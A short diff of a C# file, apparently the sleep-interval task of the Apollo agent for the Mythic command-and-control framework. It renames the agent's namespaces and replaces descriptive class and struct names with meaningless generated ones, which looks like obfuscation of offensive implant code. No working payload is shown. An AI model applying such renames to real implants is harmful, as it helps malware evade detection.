@@ -6,17 +6,17 @@
 
 #if SLEEP
 
-using ApolloInterop.Classes;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Structs.MythicStructs;
+using PhantomInterop.Classes;
+using PhantomInterop.Interfaces;
+using PhantomInterop.Structs.MythicStructs;
 using System.Runtime.Serialization;
 
 namespace Tasks
 {
-    public class sleep : Tasking
+    public class StrategicDispatcher93A7 : Tasking
     {
         [DataContract]
-        internal struct SleepParameters
+        internal struct EnhancedTransformer4750
         {
             [DataMember(Name = "interval")]
             public int Sleep;
